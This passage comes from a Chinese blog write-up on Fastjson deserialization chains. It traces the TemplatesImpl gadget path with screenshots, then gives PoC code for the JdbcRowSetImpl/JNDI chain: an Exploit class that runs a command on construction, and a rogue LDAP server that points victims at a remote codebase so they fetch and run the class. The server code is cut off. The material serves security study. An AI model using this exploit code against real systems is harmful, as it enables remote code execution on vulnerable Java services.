+<li>_bytecodes——是我们把恶意类的.class文件二进制格式进行Base64编码后得到的字符串；</li>
+<li>_outputProperties——漏洞利用链的关键会调用其参数的getOutputProperties()方法，进而导致命令执行；</li>
+<li>_tfactory:{}——在defineTransletClasses()时会调用getExternalExtensionsMap()，当为null时会报错，所以要对_tfactory设置；</li>
+</ul>
+<h3 id="分析">分析</h3>
+<p>当解析到_outputProperties的内容时，看到前面的下划线被去掉了：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://s2.loli.net/2022/02/18/L9cK7BigVvE2exd.png"
+        data-srcset="https://s2.loli.net/2022/02/18/L9cK7BigVvE2exd.png, https://s2.loli.net/2022/02/18/L9cK7BigVvE2exd.png 1.5x, https://s2.loli.net/2022/02/18/L9cK7BigVvE2exd.png 2x"
+        data-sizes="auto"
+        alt="https://s2.loli.net/2022/02/18/L9cK7BigVvE2exd.png"
+        title="https://cdn.nlark.com/yuque/0/2020/png/244880/1605496225500-6f241022-7139-4b84-b28a-b46b1de6a0d4.png#align=left&amp;amp;display=inline&amp;amp;height=529&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;originHeight=529&amp;amp;originWidth=982&amp;amp;size=0&amp;amp;status=done&amp;amp;style=none&amp;amp;width=982" /></p>
+<p>跟进该方法，发现会通过反射机制调用com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getOutputProperties()</p>
+<p>方法，可以看到该方法类型是Properties、满足之前我们得到的结论即Fastjson反序列化会调用被反序列化的类的某些满足条件的getter方法：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://s2.loli.net/2022/02/18/sUyXqmBbNEGtJwH.png"
+        data-srcset="https://s2.loli.net/2022/02/18/sUyXqmBbNEGtJwH.png, https://s2.loli.net/2022/02/18/sUyXqmBbNEGtJwH.png 1.5x, https://s2.loli.net/2022/02/18/sUyXqmBbNEGtJwH.png 2x"
+        data-sizes="auto"
+        alt="https://s2.loli.net/2022/02/18/sUyXqmBbNEGtJwH.png"
+        title="https://cdn.nlark.com/yuque/0/2020/png/244880/1605496225748-54f1f68a-2853-47c4-8739-bc4b326b6d72.png#align=left&amp;amp;display=inline&amp;amp;height=382&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;originHeight=382&amp;amp;originWidth=1279&amp;amp;size=0&amp;amp;status=done&amp;amp;style=none&amp;amp;width=1279" /></p>
+<p>跟进去，在getOutputProperties()方法中调用了newTransformer().getOutputProperties()方法：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.nlark.com/yuque/0/2020/png/244880/1605496225678-a748548c-16af-4384-8393-160288a0369a.png#align=left&amp;display=inline&amp;height=276&amp;margin=%5Bobject%20Object%5D&amp;originHeight=276&amp;originWidth=621&amp;size=0&amp;status=done&amp;style=none&amp;width=621"
+        data-srcset="https://cdn.nlark.com/yuque/0/2020/png/244880/1605496225678-a748548c-16af-4384-8393-160288a0369a.png#align=left&amp;display=inline&amp;height=276&amp;margin=%5Bobject%20Object%5D&amp;originHeight=276&amp;originWidth=621&amp;size=0&amp;status=done&amp;style=none&amp;width=621, https://cdn.nlark.com/yuque/0/2020/png/244880/1605496225678-a748548c-16af-4384-8393-160288a0369a.png#align=left&amp;display=inline&amp;height=276&amp;margin=%5Bobject%20Object%5D&amp;originHeight=276&amp;originWidth=621&amp;size=0&amp;status=done&amp;style=none&amp;width=621 1.5x, https://cdn.nlark.com/yuque/0/2020/png/244880/1605496225678-a748548c-16af-4384-8393-160288a0369a.png#align=left&amp;display=inline&amp;height=276&amp;margin=%5Bobject%20Object%5D&amp;originHeight=276&amp;originWidth=621&amp;size=0&amp;status=done&amp;style=none&amp;width=621 2x"
+        data-sizes="auto"
+        alt="https://cdn.nlark.com/yuque/0/2020/png/244880/1605496225678-a748548c-16af-4384-8393-160288a0369a.png#align=left&amp;display=inline&amp;height=276&amp;margin=%5Bobject%20Object%5D&amp;originHeight=276&amp;originWidth=621&amp;size=0&amp;status=done&amp;style=none&amp;width=621"
+        title="https://cdn.nlark.com/yuque/0/2020/png/244880/1605496225678-a748548c-16af-4384-8393-160288a0369a.png#align=left&amp;amp;display=inline&amp;amp;height=276&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;originHeight=276&amp;amp;originWidth=621&amp;amp;size=0&amp;amp;status=done&amp;amp;style=none&amp;amp;width=621" /></p>
+<p>跟进TemplatesImpl.newTransformer()方法，看到调用了getTransletInstance()方法：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.nlark.com/yuque/0/2020/png/244880/1605496225755-a5b3ae8b-fcb5-4d97-aa60-2f17e7ec100f.png#align=left&amp;display=inline&amp;height=442&amp;margin=%5Bobject%20Object%5D&amp;originHeight=442&amp;originWidth=990&amp;size=0&amp;status=done&amp;style=none&amp;width=990"
+        data-srcset="https://cdn.nlark.com/yuque/0/2020/png/244880/1605496225755-a5b3ae8b-fcb5-4d97-aa60-2f17e7ec100f.png#align=left&amp;display=inline&amp;height=442&amp;margin=%5Bobject%20Object%5D&amp;originHeight=442&amp;originWidth=990&amp;size=0&amp;status=done&amp;style=none&amp;width=990, https://cdn.nlark.com/yuque/0/2020/png/244880/1605496225755-a5b3ae8b-fcb5-4d97-aa60-2f17e7ec100f.png#align=left&amp;display=inline&amp;height=442&amp;margin=%5Bobject%20Object%5D&amp;originHeight=442&amp;originWidth=990&amp;size=0&amp;status=done&amp;style=none&amp;width=990 1.5x, https://cdn.nlark.com/yuque/0/2020/png/244880/1605496225755-a5b3ae8b-fcb5-4d97-aa60-2f17e7ec100f.png#align=left&amp;display=inline&amp;height=442&amp;margin=%5Bobject%20Object%5D&amp;originHeight=442&amp;originWidth=990&amp;size=0&amp;status=done&amp;style=none&amp;width=990 2x"
+        data-sizes="auto"
+        alt="https://cdn.nlark.com/yuque/0/2020/png/244880/1605496225755-a5b3ae8b-fcb5-4d97-aa60-2f17e7ec100f.png#align=left&amp;display=inline&amp;height=442&amp;margin=%5Bobject%20Object%5D&amp;originHeight=442&amp;originWidth=990&amp;size=0&amp;status=done&amp;style=none&amp;width=990"
+        title="https://cdn.nlark.com/yuque/0/2020/png/244880/1605496225755-a5b3ae8b-fcb5-4d97-aa60-2f17e7ec100f.png#align=left&amp;amp;display=inline&amp;amp;height=442&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;originHeight=442&amp;amp;originWidth=990&amp;amp;size=0&amp;amp;status=done&amp;amp;style=none&amp;amp;width=990" /></p>
+<p>继续跟进去查看getTransletInstance()方法，可以看到已经解析到Test类并新建一个Test类实例，注意前面会先调用defineTransletClasses()方法来生成一个Java类（Test类）：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.nlark.com/yuque/0/2020/png/244880/1605496225983-6ed5b415-094d-4c6b-ae47-0c8832fe0bb3.png#align=left&amp;display=inline&amp;height=554&amp;margin=%5Bobject%20Object%5D&amp;originHeight=554&amp;originWidth=978&amp;size=0&amp;status=done&amp;style=none&amp;width=978"
+        data-srcset="https://cdn.nlark.com/yuque/0/2020/png/244880/1605496225983-6ed5b415-094d-4c6b-ae47-0c8832fe0bb3.png#align=left&amp;display=inline&amp;height=554&amp;margin=%5Bobject%20Object%5D&amp;originHeight=554&amp;originWidth=978&amp;size=0&amp;status=done&amp;style=none&amp;width=978, https://cdn.nlark.com/yuque/0/2020/png/244880/1605496225983-6ed5b415-094d-4c6b-ae47-0c8832fe0bb3.png#align=left&amp;display=inline&amp;height=554&amp;margin=%5Bobject%20Object%5D&amp;originHeight=554&amp;originWidth=978&amp;size=0&amp;status=done&amp;style=none&amp;width=978 1.5x, https://cdn.nlark.com/yuque/0/2020/png/244880/1605496225983-6ed5b415-094d-4c6b-ae47-0c8832fe0bb3.png#align=left&amp;display=inline&amp;height=554&amp;margin=%5Bobject%20Object%5D&amp;originHeight=554&amp;originWidth=978&amp;size=0&amp;status=done&amp;style=none&amp;width=978 2x"
+        data-sizes="auto"
+        alt="https://cdn.nlark.com/yuque/0/2020/png/244880/1605496225983-6ed5b415-094d-4c6b-ae47-0c8832fe0bb3.png#align=left&amp;display=inline&amp;height=554&amp;margin=%5Bobject%20Object%5D&amp;originHeight=554&amp;originWidth=978&amp;size=0&amp;status=done&amp;style=none&amp;width=978"
+        title="https://cdn.nlark.com/yuque/0/2020/png/244880/1605496225983-6ed5b415-094d-4c6b-ae47-0c8832fe0bb3.png#align=left&amp;amp;display=inline&amp;amp;height=554&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;originHeight=554&amp;amp;originWidth=978&amp;amp;size=0&amp;amp;status=done&amp;amp;style=none&amp;amp;width=978" /></p>
+<p>再往下就是新建Test类实例的过程，并调用Test类的构造函数：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.nlark.com/yuque/0/2020/png/244880/1605496229820-fb5da03f-a565-4777-9379-32b685c90a78.png#align=left&amp;display=inline&amp;height=372&amp;margin=%5Bobject%20Object%5D&amp;originHeight=372&amp;originWidth=614&amp;size=0&amp;status=done&amp;style=none&amp;width=614"
+        data-srcset="https://cdn.nlark.com/yuque/0/2020/png/244880/1605496229820-fb5da03f-a565-4777-9379-32b685c90a78.png#align=left&amp;display=inline&amp;height=372&amp;margin=%5Bobject%20Object%5D&amp;originHeight=372&amp;originWidth=614&amp;size=0&amp;status=done&amp;style=none&amp;width=614, https://cdn.nlark.com/yuque/0/2020/png/244880/1605496229820-fb5da03f-a565-4777-9379-32b685c90a78.png#align=left&amp;display=inline&amp;height=372&amp;margin=%5Bobject%20Object%5D&amp;originHeight=372&amp;originWidth=614&amp;size=0&amp;status=done&amp;style=none&amp;width=614 1.5x, https://cdn.nlark.com/yuque/0/2020/png/244880/1605496229820-fb5da03f-a565-4777-9379-32b685c90a78.png#align=left&amp;display=inline&amp;height=372&amp;margin=%5Bobject%20Object%5D&amp;originHeight=372&amp;originWidth=614&amp;size=0&amp;status=done&amp;style=none&amp;width=614 2x"
+        data-sizes="auto"
+        alt="https://cdn.nlark.com/yuque/0/2020/png/244880/1605496229820-fb5da03f-a565-4777-9379-32b685c90a78.png#align=left&amp;display=inline&amp;height=372&amp;margin=%5Bobject%20Object%5D&amp;originHeight=372&amp;originWidth=614&amp;size=0&amp;status=done&amp;style=none&amp;width=614"
+        title="https://cdn.nlark.com/yuque/0/2020/png/244880/1605496229820-fb5da03f-a565-4777-9379-32b685c90a78.png#align=left&amp;amp;display=inline&amp;amp;height=372&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;originHeight=372&amp;amp;originWidth=614&amp;amp;size=0&amp;amp;status=done&amp;amp;style=none&amp;amp;width=614" /></p>
+<p>再之后就是弹计算器了。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.nlark.com/yuque/0/2020/png/244880/1605235152317-79708490-c7da-4b54-bd4e-1820ccb76cbd.png#align=left&amp;display=inline&amp;height=551&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=1102&amp;originWidth=1181&amp;size=193415&amp;status=done&amp;style=none&amp;width=590.5"
+        data-srcset="https://cdn.nlark.com/yuque/0/2020/png/244880/1605235152317-79708490-c7da-4b54-bd4e-1820ccb76cbd.png#align=left&amp;display=inline&amp;height=551&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=1102&amp;originWidth=1181&amp;size=193415&amp;status=done&amp;style=none&amp;width=590.5, https://cdn.nlark.com/yuque/0/2020/png/244880/1605235152317-79708490-c7da-4b54-bd4e-1820ccb76cbd.png#align=left&amp;display=inline&amp;height=551&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=1102&amp;originWidth=1181&amp;size=193415&amp;status=done&amp;style=none&amp;width=590.5 1.5x, https://cdn.nlark.com/yuque/0/2020/png/244880/1605235152317-79708490-c7da-4b54-bd4e-1820ccb76cbd.png#align=left&amp;display=inline&amp;height=551&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=1102&amp;originWidth=1181&amp;size=193415&amp;status=done&amp;style=none&amp;width=590.5 2x"
+        data-sizes="auto"
+        alt="https://cdn.nlark.com/yuque/0/2020/png/244880/1605235152317-79708490-c7da-4b54-bd4e-1820ccb76cbd.png#align=left&amp;display=inline&amp;height=551&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=1102&amp;originWidth=1181&amp;size=193415&amp;status=done&amp;style=none&amp;width=590.5"
+        title="https://cdn.nlark.com/yuque/0/2020/png/244880/1605235152317-79708490-c7da-4b54-bd4e-1820ccb76cbd.png#align=left&amp;amp;display=inline&amp;amp;height=551&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=1102&amp;amp;originWidth=1181&amp;amp;size=193415&amp;amp;status=done&amp;amp;style=none&amp;amp;width=590.5" /></p>
+<h2 id="基于jdbcrowsetimpl的利用链">基于JdbcRowSetImpl的利用链</h2>
+<h3 id="依赖-1">依赖</h3>
+<p><strong>基于RMI利用的JDK版本&lt;=6u141、7u131、8u121，基于LDAP利用的JDK版本&lt;=6u211、7u201、8u191。</strong> <strong>并且实际利用中需要连接远程恶意服务器，在目标没外网的情况下无法直接利用；</strong></p>
+<h3 id="poc-1">POC</h3>
+<p><strong>Exploit.java</strong></p>
+<p>注：编译exploit.class中不能有包名</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kn">import</span> <span class="nn">javax.naming.Context</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">javax.naming.Name</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">javax.naming.spi.ObjectFactory</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.io.Serializable</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.util.Hashtable</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">Exploit</span> <span class="kd">implements</span> <span class="n">ObjectFactory</span><span class="o">,</span> <span class="n">Serializable</span> <span class="o">{</span>
+    <span class="cm">/**
+</span><span class="cm">     * 要注册的Exploit
+</span><span class="cm">     */</span>
+    <span class="kd">public</span> <span class="nf">Exploit</span><span class="o">()</span> <span class="o">{</span>
+        <span class="k">try</span> <span class="o">{</span>
+            <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="s">&#34;calc&#34;</span><span class="o">);</span>
+        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">IOException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+
+    <span class="nd">@Override</span>
+    <span class="kd">public</span> <span class="n">Object</span> <span class="nf">getObjectInstance</span><span class="o">(</span><span class="n">Object</span> <span class="n">obj</span><span class="o">,</span> <span class="n">Name</span> <span class="n">name</span><span class="o">,</span> <span class="n">Context</span> <span class="n">nameCtx</span><span class="o">,</span> <span class="n">Hashtable</span><span class="o">&lt;?,</span> <span class="o">?&gt;</span> <span class="n">environment</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
+        <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
+        <span class="n">Exploit</span> <span class="n">exploit</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Exploit</span><span class="o">();</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><strong>ldap</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span><span class="lnt">79
+</span><span class="lnt">80
+</span><span class="lnt">81
+</span><span class="lnt">82
+</span><span class="lnt">83
+</span><span class="lnt">84
+</span><span class="lnt">85
+</span><span class="lnt">86
+</span><span class="lnt">87
+</span><span class="lnt">88
+</span><span class="lnt">89
+</span><span class="lnt">90
+</span><span class="lnt">91
+</span><span class="lnt">92
+</span><span class="lnt">93
+</span><span class="lnt">94
+</span><span class="lnt">95
+</span><span class="lnt">96
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kn">package</span> <span class="nn">com.JNDI</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">com.unboundid.ldap.listener.InMemoryDirectoryServer</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">com.unboundid.ldap.listener.InMemoryDirectoryServerConfig</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">com.unboundid.ldap.listener.InMemoryListenerConfig</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">com.unboundid.ldap.sdk.Entry</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">com.unboundid.ldap.sdk.LDAPException</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">com.unboundid.ldap.sdk.LDAPResult</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">com.unboundid.ldap.sdk.ResultCode</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">javax.net.ServerSocketFactory</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">javax.net.SocketFactory</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">javax.net.ssl.SSLSocketFactory</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.net.InetAddress</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.net.MalformedURLException</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.net.URL</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">LdapServer</span> <span class="o">{</span>
+
+    <span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="n">String</span> <span class="n">LDAP_BASE</span> <span class="o">=</span> <span class="s">&#34;dc=example,dc=com&#34;</span><span class="o">;</span>
+
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span> <span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
+
+        <span class="n">String</span> <span class="n">url</span> <span class="o">=</span> <span class="s">&#34;http://127.0.0.1:8000/#Exploit&#34;</span><span class="o">;</span>
+        <span class="kt">int</span> <span class="n">port</span> <span class="o">=</span> <span class="n">1389</span><span class="o">;</span>
+
+        <span class="k">try</span> <span class="o">{</span>
+            <span class="n">InMemoryDirectoryServerConfig</span> <span class="n">config</span> <span class="o">=</span> <span class="k">new</span> <span class="n">InMemoryDirectoryServerConfig</span><span class="o">(</span><span class="n">LDAP_BASE</span><span class="o">);</span>
+            <span class="n">config</span><span class="o">.</span><span class="na">setListenerConfigs</span><span class="o">(</span><span class="k">new</span> <span class="n">InMemoryListenerConfig</span><span class="o">(</span>
+                    <span class="s">&#34;listen&#34;</span><span class="o">,</span>
+                    <span class="n">InetAddress</span><span class="o">.</span><span class="na">getByName</span><span class="o">(</span><span class="s">&#34;0.0.0.0&#34;</span><span class="o">),</span>
+                    <span class="n">port</span><span class="o">,</span>
+                    <span class="n">ServerSocketFactory</span><span class="o">.</span><span class="na">getDefault</span><span class="o">(),</span>
+                    <span class="n">SocketFactory</span><span class="o">.</span><span class="na">getDefault</span><span class="o">(),</span>
+                    <span class="o">(</span><span class="n">SSLSocketFactory</span><span class="o">)</span> <span class="n">SSLSocketFactory</span><span class="o">.</span><span class="na">getDefault</span><span class="o">()));</span>
+
+            <span class="n">config</span><span class="o">.</span><span class="na">addInMemoryOperationInterceptor</span><span class="o">(</span><span class="k">new</span> <span class="n">OperationInterceptor</span><span class="o">(</span><span class="k">new</span> <span class="n">URL</span><span class="o">(</span><span class="n">url</span><span class="o">)));</span>
+            <span class="n">InMemoryDirectoryServer</span> <span class="n">ds</span> <span class="o">=</span> <span class="k">new</span> <span class="n">InMemoryDirectoryServer</span><span class="o">(</span><span class="n">config</span><span class="o">);</span>
+            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;Listening on 0.0.0.0:&#34;</span> <span class="o">+</span> <span class="n">port</span><span class="o">);</span>
+            <span class="n">ds</span><span class="o">.</span><span class="na">startListening</span><span class="o">();</span>
+
+        <span class="o">}</span>
+        <span class="k">catch</span> <span class="o">(</span> <span class="n">Exception</span> <span class="n">e</span> <span class="o">)</span> <span class="o">{</span>
+            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+
+    <span class="kd">private</span> <span class="kd">static</span> <span class="kd">class</span> <span class="nc">OperationInterceptor</span> <span class="kd">extends</span> <span class="n">InMemoryOperationInterceptor</span> <span class="o">{</span>
+
+        <span class="kd">private</span> <span class="n">URL</span> <span class="n">codebase</span><span class="o">;</span>
+
+        <span class="cm">/**
+</span><span class="cm">         *
+</span><span class="cm">         */</span>
+        <span class="kd">public</span> <span class="nf">OperationInterceptor</span> <span class="o">(</span> <span class="n">URL</span> <span class="n">cb</span> <span class="o">)</span> <span class="o">{</span>
+            <span class="k">this</span><span class="o">.</span><span class="na">codebase</span> <span class="o">=</span> <span class="n">cb</span><span class="o">;</span>
+        <span class="o">}</span>
+
+        <span class="cm">/**
+</span><span class="cm">         * {@inheritDoc}
+</span><span class="cm">         *
+</span><span class="cm">         * @see com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)
+</span><span class="cm">         */</span>
+        <span class="nd">@Override</span>
+        <span class="kd">public</span> <span class="kt">void</span> <span class="nf">processSearchResult</span> <span class="o">(</span> <span class="n">InMemoryInterceptedSearchResult</span> <span class="n">result</span> <span class="o">)</span> <span class="o">{</span>
+            <span class="n">String</span> <span class="n">base</span> <span class="o">=</span> <span class="n">result</span><span class="o">.</span><span class="na">getRequest</span><span class="o">().</span><span class="na">getBaseDN</span><span class="o">();</span>
+            <span class="n">Entry</span> <span class="n">e</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Entry</span><span class="o">(</span><span class="n">base</span><span class="o">);</span>
+            <span class="k">try</span> <span class="o">{</span>
+                <span class="n">sendResult</span><span class="o">(</span><span class="n">result</span><span class="o">,</span> <span class="n">base</span><span class="o">,</span> <span class="n">e</span><span class="o">);</span>
+            <span class="o">}</span>
+            <span class="k">catch</span> <span class="o">(</span> <span class="n">Exception</span> <span class="n">e1</span> <span class="o">)</span> <span class="o">{</span>
+                <span class="n">e1</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+            <span class="o">}</span>
+
+        <span class="o">}</span>
+
+        <span class="kd">protected</span> <span class="kt">void</span> <span class="nf">sendResult</span> <span class="o">(</span> <span class="n">InMemoryInterceptedSearchResult</span> <span class="n">result</span><span class="o">,</span> <span class="n">String</span> <span class="n">base</span><span class="o">,</span> <span class="n">Entry</span> <span class="n">e</span> <span class="o">)</span> <span class="kd">throws</span> <span class="n">LDAPException</span><span class="o">,</span> <span class="n">MalformedURLException</span> <span class="o">{</span>
+            <span class="n">URL</span> <span class="n">turl</span> <span class="o">=</span> <span class="k">new</span> <span class="n">URL</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">codebase</span><span class="o">,</span> <span class="k">this</span><span class="o">.</span><span class="na">codebase</span><span class="o">.</span><span class="na">getRef</span><span class="o">().</span><span class="na">replace</span><span class="o">(</span><span class="sc">&#39;.&#39;</span><span class="o">,</span> <span class="sc">&#39;/&#39;</span><span class="o">).</span><span class="na">concat</span><span class="o">(</span><span class="s">&#34;.class&#34;</span><span class="o">));</span>
+            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;Send LDAP reference result for &#34;</span> <span class="o">+</span> <span class="n">base</span> <span class="o">+</span> <span class="s">&#34; redirecting to &#34;</span> <span class="o">+</span> <span class="n">turl</span><span class="o">);</span>
+            <span class="n">e</span><span class="o">.</span><span class="na">addAttribute</span><span class="o">(</span><span class="s">&#34;javaClassName&#34;</span><span class="o">,</span> <span class="s">&#34;Exploit&#34;</span><span class="o">);</span>
+            <span class="n">String</span> <span class="n">cbstring</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">codebase</span><span class="o">.</span><span class="na">toString</span><span class="o">();</span>
+            <span class="kt">int</span> <span class="n">refPos</span> <span class="o">=</span> <span class="n">cbstring</span><span class="o">.</span><span class="na">indexOf</span><span class="o">(</span><span class="sc">&#39;#&#39;</span><span class="o">);</span>
+            <span class="k">if</span> <span class="o">(</span> <span class="n">refPos</span> <span class="o">&gt;</span> <span class="n">0</span> <span class="o">)</span> <span class="o">{</span>
+                <span class="n">cbstring</span> <span class="o">=</span> <span class="n">cbstring</span><span class="o">.</span><span class="na">substring</span><span class="o">(</span><span class="n">0</span><span class="o">,</span> <span class="n">refPos</span><span class="o">);</span>
+            <span class="o">}</span>
+            <span class="n">e</span><span class="o">.</span><span class="na">addAttribute</span><span class="o">(</span><span class="s">&#34;javaCodeBase&#34;</span><span class="o">,</span> <span class="n">cbstring</span><span class="o">);</span>
+            <span class="n">e</span><span class="o">.</span><span class="na">addAttribute</span><span class="o">(</span><span class="s">&#34;objectClass&#34;</span><span class="o">,</span> <span class="s">&#34;javaNamingReference&#34;</span><span class="o">);</span>
+            <span class="n">e</span><span class="o">.</span><span class="na">addAttribute</span><span class="o">(</span><span class="s">&#34;javaFactory&#34;</span><span class="o">,</span> <span class="k">this</span><span class="o">.</span><span class="na">codebase</span><span class="o">.</span><span class="na">getRef</span><span class="o">());</span>
+            <span class="n">result</span><span class="o">.</span><span class="na">sendSearchEntry</span><span class="o">(</span><span class="n">e</span><span class="o">);</span>
+            <span class="n">result</span><span class="o">.</span><span class="na">setResult</span><span class="o">(</span><span class="k">new</span> <span class="n">LDAPResult</span><span class="o">(</span><span class="n">0</span><span class="o">,</span> <span class="n">ResultCode</span><span class="o">.</span><span class="na">SUCCESS</span><span class="o">));</span>
+        <span class="o">}</span>
+
